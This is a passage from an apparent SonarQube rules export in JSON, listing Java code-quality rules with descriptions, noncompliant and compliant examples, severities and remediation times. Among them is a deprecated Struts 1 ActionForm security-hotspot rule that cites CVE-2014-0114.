            "mdDesc":"<p>Non-encoded control characters and whitespace characters are often injected in the source code because of a bad manipulation. They are either\ninvisible or difficult to recognize, which can result in bugs when the string is not what the developer expects. If you actually need to use a control\ncharacter use their encoded version (ex: ASCII <code>\\n,\\t,</code>... or Unicode <code>U+000D, U+0009,</code>...).</p>\n<p>This rule raises an issue when the following characters are seen in a literal string:</p>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/ASCII#Control_characters\">ASCII control character</a>. (character index &lt; 32 or = 127) </li>\n  <li> Unicode <a href=\"https://en.wikipedia.org/wiki/Unicode_character_property#Whitespace\">whitespace characters</a>. </li>\n  <li> Unicode <a href=\"https://en.wikipedia.org/wiki/C0_and_C1_control_codes\">C0 control characters</a> </li>\n  <li> Unicode characters <code>U+200B, U+200C, U+200D, U+2060, U+FEFF, U+2028, U+2029</code> </li>\n</ul>\n<p>No issue will be raised on the simple space character. Unicode <code>U+0020</code>, ASCII 32.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString tabInside = \"A\tB\";  // Noncompliant, contains a tabulation\nString zeroWidthSpaceInside = \"foo​bar\"; // Noncompliant, it contains a U+200B character inside\nchar tab = '\t';\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString tabInside = \"A\\tB\";  // Compliant, uses escaped value\nString zeroWidthSpaceInside = \"foo\​bar\";  // Compliant, uses escaped value\nchar tab = '\\t';\n</pre>\n<h2>Exceptions</h2>\n<p>Text Blocks string literals (java 13 three double-quote marks) can contain tabulations to allow indentation using tabulations.</p>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2116",
            "repo": "java",
            "name": "\"hashCode\" and \"toString\" should not be called on array instances",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>While <code>hashCode</code> and <code>toString</code> are available on arrays, they are largely useless. <code>hashCode</code> returns the array's\n\"identity hash code\", and <code>toString</code> returns nearly the same value. Neither method's output actually reflects the array's contents.\nInstead, you should pass the array to the relevant static <code>Arrays</code> method.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic static void main( String[] args )\n{\n    String argStr = args.toString(); // Noncompliant\n    int argHash = args.hashCode(); // Noncompliant\n\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic static void main( String[] args )\n{\n    String argStr = Arrays.toString(args);\n    int argHash = Arrays.hashCode(args);\n\n</pre>",
            "mdDesc": "<p>While <code>hashCode</code> and <code>toString</code> are available on arrays, they are largely useless. <code>hashCode</code> returns the array's\n\"identity hash code\", and <code>toString</code> returns nearly the same value. Neither method's output actually reflects the array's contents.\nInstead, you should pass the array to the relevant static <code>Arrays</code> method.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic static void main( String[] args )\n{\n    String argStr = args.toString(); // Noncompliant\n    int argHash = args.hashCode(); // Noncompliant\n\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic static void main( String[] args )\n{\n    String argStr = Arrays.toString(args);\n    int argHash = Arrays.hashCode(args);\n\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S5867",
            "repo": "java",
            "name": "Unicode-aware versions of character classes should be preferred",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When using POSIX classes like <code>\\p{Alpha}</code> without the <code>UNICODE_CHARACTER_CLASS</code> flag or when using hard-coded character\nclasses like <code>\"[a-zA-Z]\"</code>, letters outside of the ASCII range, such as umlauts, accented letters or letter from non-Latin languages, won't\nbe matched. This may cause code to incorrectly handle input containing such letters.</p>\n<p>To correctly handle non-ASCII input, it is recommended to use Unicode classes like <code>\\p{IsAlphabetic}</code>. When using POSIX classes, Unicode\nsupport should be enabled by either passing <code>Pattern.UNICODE_CHARACTER_CLASS</code> as a flag to <code>Pattern.compile</code> or by using\n<code>(?U)</code> inside the regex.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nPattern.compile(\"[a-zA-Z]\");\nPattern.compile(\"\\\\p{Alpha}\");\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPattern.compile(\"\\\\p{IsAlphabetic}\"); // matches all letters from all languages\nPattern.compile(\"\\\\p{IsLatin}\"); // matches latin letters, including umlauts and other non-ASCII variations\nPattern.compile(\"\\\\p{Alpha}\", Pattern.UNICODE_CHARACTER_CLASS);\nPattern.compile(\"(?U)\\\\p{Alpha}\");\n</pre>",
            "mdDesc": "<p>When using POSIX classes like <code>\\p{Alpha}</code> without the <code>UNICODE_CHARACTER_CLASS</code> flag or when using hard-coded character\nclasses like <code>\"[a-zA-Z]\"</code>, letters outside of the ASCII range, such as umlauts, accented letters or letter from non-Latin languages, won't\nbe matched. This may cause code to incorrectly handle input containing such letters.</p>\n<p>To correctly handle non-ASCII input, it is recommended to use Unicode classes like <code>\\p{IsAlphabetic}</code>. When using POSIX classes, Unicode\nsupport should be enabled by either passing <code>Pattern.UNICODE_CHARACTER_CLASS</code> as a flag to <code>Pattern.compile</code> or by using\n<code>(?U)</code> inside the regex.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nPattern.compile(\"[a-zA-Z]\");\nPattern.compile(\"\\\\p{Alpha}\");\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPattern.compile(\"\\\\p{IsAlphabetic}\"); // matches all letters from all languages\nPattern.compile(\"\\\\p{IsLatin}\"); // matches latin letters, including umlauts and other non-ASCII variations\nPattern.compile(\"\\\\p{Alpha}\", Pattern.UNICODE_CHARACTER_CLASS);\nPattern.compile(\"(?U)\\\\p{Alpha}\");\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "regex"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2234",
            "repo": "java",
            "name": "Parameters should be passed in the correct order",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When the names of parameters in a method call match the names of the method arguments, it contributes to clearer, more readable code. However, when\nthe names match, but are passed in a different order than the method arguments, it indicates a mistake in the parameter order which will likely lead\nto unexpected results.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic double divide(int divisor, int dividend) {\n  return divisor/dividend;\n}\n\npublic void doTheThing() {\n  int divisor = 15;\n  int dividend = 5;\n\n  double result = divide(dividend, divisor);  // Noncompliant; operation succeeds, but result is unexpected\n  //...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic double divide(int divisor, int dividend) {\n  return divisor/dividend;\n}\n\npublic void doTheThing() {\n  int divisor = 15;\n  int dividend = 5;\n\n  double result = divide(divisor, dividend);\n  //...\n}\n</pre>",
            "mdDesc": "<p>When the names of parameters in a method call match the names of the method arguments, it contributes to clearer, more readable code. However, when\nthe names match, but are passed in a different order than the method arguments, it indicates a mistake in the parameter order which will likely lead\nto unexpected results.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic double divide(int divisor, int dividend) {\n  return divisor/dividend;\n}\n\npublic void doTheThing() {\n  int divisor = 15;\n  int dividend = 5;\n\n  double result = divide(dividend, divisor);  // Noncompliant; operation succeeds, but result is unexpected\n  //...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic double divide(int divisor, int dividend) {\n  return divisor/dividend;\n}\n\npublic void doTheThing() {\n  int divisor = 15;\n  int dividend = 5;\n\n  double result = divide(divisor, dividend);\n  //...\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5866",
            "repo": "java",
            "name": "Case insensitive Unicode regular expressions should enable the “UNICODE_CASE” flag",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>By default case insensitivity only affects letters in the ASCII range. This can be changed by either passing <code>Pattern.UNICODE_CASE</code> or\n<code>Pattern.UNICODE_CHARACTER_CLASS</code> as an argument to <code>Pattern.compile</code> or using <code>(?u)</code> or <code>(?U)</code> within the\nregex.</p>\n<p>If not done, regular expressions involving non-ASCII letters will still handle those letters as being case sensitive.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nPattern.compile(\"söme pättern\", Pattern.CASE_INSENSITIVE);\nstr.matches(\"(?i)söme pättern\");\nstr.matches(\"(?i:söme) pättern\");\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPattern.compile(\"söme pättern\", Pattern.CASE_INSENSITIVE | Pattern.UNICODE_CASE);\nstr.matches(\"(?iu)söme pättern\");\nstr.matches(\"(?iu:söme) pättern\");\n\n// UNICODE_CHARACTER_CLASS implies UNICODE_CASE\nPattern.compile(\"söme pättern\", Pattern.CASE_INSENSITIVE | Pattern.UNICODE_CHARACTER_CLASS);\nstr.matches(\"(?iU)söme pättern\");\nstr.matches(\"(?iU:söme) pättern\");\n</pre>",
            "mdDesc": "<p>By default case insensitivity only affects letters in the ASCII range. This can be changed by either passing <code>Pattern.UNICODE_CASE</code> or\n<code>Pattern.UNICODE_CHARACTER_CLASS</code> as an argument to <code>Pattern.compile</code> or using <code>(?u)</code> or <code>(?U)</code> within the\nregex.</p>\n<p>If not done, regular expressions involving non-ASCII letters will still handle those letters as being case sensitive.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nPattern.compile(\"söme pättern\", Pattern.CASE_INSENSITIVE);\nstr.matches(\"(?i)söme pättern\");\nstr.matches(\"(?i:söme) pättern\");\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPattern.compile(\"söme pättern\", Pattern.CASE_INSENSITIVE | Pattern.UNICODE_CASE);\nstr.matches(\"(?iu)söme pättern\");\nstr.matches(\"(?iu:söme) pättern\");\n\n// UNICODE_CHARACTER_CLASS implies UNICODE_CASE\nPattern.compile(\"söme pättern\", Pattern.CASE_INSENSITIVE | Pattern.UNICODE_CHARACTER_CLASS);\nstr.matches(\"(?iU)söme pättern\");\nstr.matches(\"(?iU:söme) pättern\");\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "regex"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1145",
            "repo": "java",
            "name": "Useless \"if(true) {...}\" and \"if(false){...}\" blocks should be removed",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code>\nstatements with conditions that are always true are completely redundant, and make the code less readable.</p>\n<p>There are three possible causes for the presence of such code: </p>\n<ul>\n  <li> An if statement was changed during debugging and that debug code has been committed. </li>\n  <li> Some value was left unset. </li>\n  <li> Some logic is not doing what the programmer thought it did. </li>\n</ul>\n<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (true) {\n  doSomething();\n}\n...\nif (false) {\n  doSomethingElse();\n}\n\nif (2 &lt; 3 ) { ... }  // Noncompliant; always false\n\nint i = 0;\nint j = 0;\n// ...\nj = foo();\n\nif (j &gt; 0 &amp;&amp; i &gt; 0) { ... }  // Noncompliant; always false - i never set after initialization\n\nboolean b = true;\n//...\nif (b || !b) { ... }  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ndoSomething();\n...\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/489.html\">MITRE, CWE-489</a> - Leftover Debug Code </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/570.html\">MITRE, CWE-570</a> - Expression is Always False </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/571.html\">MITRE, CWE-571</a> - Expression is Always True </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use <a href='/coding_rules#rule_key=java%3AS2583'>S2583</a> instead.</p>",
            "mdDesc": "<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code>\nstatements with conditions that are always true are completely redundant, and make the code less readable.</p>\n<p>There are three possible causes for the presence of such code: </p>\n<ul>\n  <li> An if statement was changed during debugging and that debug code has been committed. </li>\n  <li> Some value was left unset. </li>\n  <li> Some logic is not doing what the programmer thought it did. </li>\n</ul>\n<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (true) {\n  doSomething();\n}\n...\nif (false) {\n  doSomethingElse();\n}\n\nif (2 &lt; 3 ) { ... }  // Noncompliant; always false\n\nint i = 0;\nint j = 0;\n// ...\nj = foo();\n\nif (j &gt; 0 &amp;&amp; i &gt; 0) { ... }  // Noncompliant; always false - i never set after initialization\n\nboolean b = true;\n//...\nif (b || !b) { ... }  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ndoSomething();\n...\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/489.html\">MITRE, CWE-489</a> - Leftover Debug Code </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/570.html\">MITRE, CWE-570</a> - Expression is Always False </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/571.html\">MITRE, CWE-571</a> - Expression is Always True </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use {rule:java:S2583} instead.</p>",
            "severity": "MAJOR",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2114",
            "repo": "java",
            "name": "Collections should not be passed as arguments to their own methods",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Passing a collection as an argument to the collection's own method is either an error - some other argument was intended - or simply nonsensical\ncode. </p>\n<p>Further, because some methods require that the argument remain unmodified during the execution, passing a collection to itself can result in\nundefined behavior. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nList &lt;Object&gt; objs = new ArrayList&lt;Object&gt;();\nobjs.add(\"Hello\");\n\nobjs.add(objs); // Noncompliant; StackOverflowException if objs.hashCode() called\nobjs.addAll(objs); // Noncompliant; behavior undefined\nobjs.containsAll(objs); // Noncompliant; always true\nobjs.removeAll(objs); // Noncompliant; confusing. Use clear() instead\nobjs.retainAll(objs); // Noncompliant; NOOP\n</pre>",
            "mdDesc": "<p>Passing a collection as an argument to the collection's own method is either an error - some other argument was intended - or simply nonsensical\ncode. </p>\n<p>Further, because some methods require that the argument remain unmodified during the execution, passing a collection to itself can result in\nundefined behavior. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nList &lt;Object&gt; objs = new ArrayList&lt;Object&gt;();\nobjs.add(\"Hello\");\n\nobjs.add(objs); // Noncompliant; StackOverflowException if objs.hashCode() called\nobjs.addAll(objs); // Noncompliant; behavior undefined\nobjs.containsAll(objs); // Noncompliant; always true\nobjs.removeAll(objs); // Noncompliant; confusing. Use clear() instead\nobjs.retainAll(objs); // Noncompliant; NOOP\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2235",
            "repo": "java",
            "name": "IllegalMonitorStateException should not be caught",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>According to Oracle Javadoc:</p>\n<blockquote>\n  <p><code>IllegalMonitorStateException</code> is thrown when a thread has attempted to wait on an object's monitor or to notify other threads waiting\n  on an object's monitor without owning the specified monitor.</p>\n</blockquote>\n<p>In other words, this exception can be thrown only in case of bad design because <code>Object.wait(...)</code>, <code>Object.notify()</code> and\n<code>Object.notifyAll()</code> methods should never be called on an object whose monitor is not held. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomething(){\n  ...\n  try {\n    ...\n    anObject.notify();\n    ...\n  } catch(IllegalMonitorStateException e) {\n    ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomething(){\n  ...\n  synchronized(anObject) {\n    ...\n    anObject.notify();\n    ...\n  }\n}\n</pre>",
            "mdDesc": "<p>According to Oracle Javadoc:</p>\n<blockquote>\n  <p><code>IllegalMonitorStateException</code> is thrown when a thread has attempted to wait on an object's monitor or to notify other threads waiting\n  on an object's monitor without owning the specified monitor.</p>\n</blockquote>\n<p>In other words, this exception can be thrown only in case of bad design because <code>Object.wait(...)</code>, <code>Object.notify()</code> and\n<code>Object.notifyAll()</code> methods should never be called on an object whose monitor is not held. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomething(){\n  ...\n  try {\n    ...\n    anObject.notify();\n    ...\n  } catch(IllegalMonitorStateException e) {\n    ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomething(){\n  ...\n  synchronized(anObject) {\n    ...\n    anObject.notify();\n    ...\n  }\n}\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "error-handling",
                "multi-threading"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1144",
            "repo": "java",
            "name": "Unused \"private\" methods should be removed",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>private</code> methods that are never executed are dead code: unnecessary, inoperative code that should be removed. Cleaning out dead code\ndecreases the size of the maintained codebase, making it easier to understand the program and preventing bugs from being introduced.</p>\n<p>Note that this rule does not take reflection into account, which means that issues will be raised on <code>private</code> methods that are only\naccessed using the reflection API.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Foo implements Serializable\n{\n  private Foo(){}     //Compliant, private empty constructor intentionally used to prevent any direct instantiation of a class.\n  public static void doSomething(){\n    Foo foo = new Foo();\n    ...\n  }\n  private void unusedPrivateMethod(){...}\n  private void writeObject(ObjectOutputStream s){...}  //Compliant, relates to the java serialization mechanism\n  private void readObject(ObjectInputStream in){...}  //Compliant, relates to the java serialization mechanism\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Foo implements Serializable\n{\n  private Foo(){}     //Compliant, private empty constructor intentionally used to prevent any direct instantiation of a class.\n  public static void doSomething(){\n    Foo foo = new Foo();\n    ...\n  }\n\n  private void writeObject(ObjectOutputStream s){...}  //Compliant, relates to the java serialization mechanism\n\n  private void readObject(ObjectInputStream in){...}  //Compliant, relates to the java serialization mechanism\n}\n</pre>\n<h2>Exceptions</h2>\n<p>This rule doesn't raise any issue on annotated methods.</p>",
            "mdDesc": "<p><code>private</code> methods that are never executed are dead code: unnecessary, inoperative code that should be removed. Cleaning out dead code\ndecreases the size of the maintained codebase, making it easier to understand the program and preventing bugs from being introduced.</p>\n<p>Note that this rule does not take reflection into account, which means that issues will be raised on <code>private</code> methods that are only\naccessed using the reflection API.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Foo implements Serializable\n{\n  private Foo(){}     //Compliant, private empty constructor intentionally used to prevent any direct instantiation of a class.\n  public static void doSomething(){\n    Foo foo = new Foo();\n    ...\n  }\n  private void unusedPrivateMethod(){...}\n  private void writeObject(ObjectOutputStream s){...}  //Compliant, relates to the java serialization mechanism\n  private void readObject(ObjectInputStream in){...}  //Compliant, relates to the java serialization mechanism\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Foo implements Serializable\n{\n  private Foo(){}     //Compliant, private empty constructor intentionally used to prevent any direct instantiation of a class.\n  public static void doSomething(){\n    Foo foo = new Foo();\n    ...\n  }\n\n  private void writeObject(ObjectOutputStream s){...}  //Compliant, relates to the java serialization mechanism\n\n  private void readObject(ObjectInputStream in){...}  //Compliant, relates to the java serialization mechanism\n}\n</pre>\n<h2>Exceptions</h2>\n<p>This rule doesn't raise any issue on annotated methods.</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "unused"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S4530",
            "repo": "java",
            "name": "Using Struts 1 ActionForm is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Using Struts 1 ActionForm is security-sensitive. For example, their use has led in the past to the following vulnerability:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0114\">CVE-2014-0114</a> </li>\n</ul>\n<p>All classes extending <code>org.apache.struts.action.Action</code> are potentially remotely reachable. The <code>ActionForm</code> object provided\nas a parameter of the <code>execute</code> method is automatically instantiated and populated with the HTTP parameters. One should review the use of\nthese parameters to be sure they are used safely. </p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> some parameters of the ActionForm might not have been validated properly. </li>\n  <li> dangerous parameter names are accepted. Example: accept a \"class\" parameter and use the form to populate JavaBean properties (see the\n  CVE-2014-0114 above). </li>\n  <li> there are unused fields which are not empty or undefined. </li>\n</ul>\n<p>You are at risk if you answered to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>All ActionForm's properties should be validated, including their size. Whenever possible, filter the parameters with a whitelist of valid values.\nOtherwise, escape any sensitive character and constrain the values as much as possible.</p>\n<p>Allow only non security-sensitive property names. All the ActionForm's property names should be whitelisted.</p>\n<p>Unused fields should be constrained so that they are either empty or undefined.</p>\n<h1>Noncompliant Code Example</h1>\n<pre>\n// Struts 1.1+\npublic final class CashTransferAction extends Action {\n\n  public String fromAccount = \"\";\n  public String toAccount = \"\";\n\n  public ActionForward execute(ActionMapping mapping, ActionForm form, HttpServletRequest req, HttpServletResponse res) throws Exception {\n    // usage of the \"form\" object to call some services doing JDBC actions\n    [...]\n    return mapping.findForward(resultat);\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A1-Injection\">OWASP Top 10 2017 Category A1</a> - Injection </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/105.html\">MITRE, CWE-105</a>: Struts Form Field Without Validator </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "mdDesc": "<p>Using Struts 1 ActionForm is security-sensitive. For example, their use has led in the past to the following vulnerability:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0114\">CVE-2014-0114</a> </li>\n</ul>\n<p>All classes extending <code>org.apache.struts.action.Action</code> are potentially remotely reachable. The <code>ActionForm</code> object provided\nas a parameter of the <code>execute</code> method is automatically instantiated and populated with the HTTP parameters. One should review the use of\nthese parameters to be sure they are used safely. </p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> some parameters of the ActionForm might not have been validated properly. </li>\n  <li> dangerous parameter names are accepted. Example: accept a \"class\" parameter and use the form to populate JavaBean properties (see the\n  CVE-2014-0114 above). </li>\n  <li> there are unused fields which are not empty or undefined. </li>\n</ul>\n<p>You are at risk if you answered to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>All ActionForm's properties should be validated, including their size. Whenever possible, filter the parameters with a whitelist of valid values.\nOtherwise, escape any sensitive character and constrain the values as much as possible.</p>\n<p>Allow only non security-sensitive property names. All the ActionForm's property names should be whitelisted.</p>\n<p>Unused fields should be constrained so that they are either empty or undefined.</p>\n<h1>Noncompliant Code Example</h1>\n<pre>\n// Struts 1.1+\npublic final class CashTransferAction extends Action {\n\n  public String fromAccount = \"\";\n  public String toAccount = \"\";\n\n  public ActionForward execute(ActionMapping mapping, ActionForm form, HttpServletRequest req, HttpServletResponse res) throws Exception {\n    // usage of the \"form\" object to call some services doing JDBC actions\n    [...]\n    return mapping.findForward(resultat);\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A1-Injection\">OWASP Top 10 2017 Category A1</a> - Injection </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/105.html\">MITRE, CWE-105</a>: Struts Form Field Without Validator </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "severity": "MAJOR",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S2111",
            "repo": "java",
            "name": "\"BigDecimal(double)\" should not be used",
            "createdAt": "2022-09-26T07:32:37+0000",
